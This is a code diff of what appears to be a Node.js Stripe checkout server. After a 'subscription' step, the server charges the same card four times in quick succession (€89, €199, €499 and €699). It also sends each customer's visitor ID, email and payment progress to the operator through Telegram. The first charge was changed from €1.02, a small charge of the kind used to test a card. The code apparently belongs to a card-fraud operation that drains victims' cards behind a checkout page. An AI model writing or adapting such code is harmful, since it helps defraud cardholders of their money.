@@ -92,6 +92,18 @@ app.post('/create-setup-intent', async (req, res) => {
   }
 });
 
+app.post('/payment-initiated', async (req, res) => {
+  const { visitorId, email } = req.body;
+  await sendTelegram(
+    `💳 <b>Zahlungsversuch gestartet!</b>\n\n` +
+    `🆔 Visitor ID: <code>${visitorId}</code>\n` +
+    `📧 Email: ${email}\n` +
+    `⏳ Kunde hat auf "Jetzt bezahlen" geklickt\n` +
+    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
+  );
+  res.json({ ok: true });
+});
+
 app.post('/create-subscription', async (req, res) => {
   const { customerId, paymentMethodId, visitorId } = req.body;
   try {
@@ -100,10 +112,10 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €1.02
+    // Charge 1 — €89.00
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 102,
+        amount: 8900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -140,10 +152,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €799
+    // Charge 3 — €499
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 79900,
+        amount: 49900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -160,10 +172,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 4 — €799
+    // Charge 4 — €699
     try {
       const payment4 = await stripe.paymentIntents.create({
-        amount: 79900,
+        amount: 69900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -194,10 +206,10 @@ app.post('/create-subscription', async (req, res) => {
     await sendTelegram(
       `✅ <b>Zahlung erfolgreich!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
-      `💳 Payment 1: €1.02\n` +
+      `💳 Payment 1: €89.00\n` +
       `💳 Payment 2: €199.00\n` +
-      `💳 Payment 3: €799.00\n` +
-      `💳 Payment 4: €799.00\n` +
+      `💳 Payment 3: €499.00\n` +
+      `💳 Payment 4: €699.00\n` +
       `🆔 Subscription: ${subscription.id}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
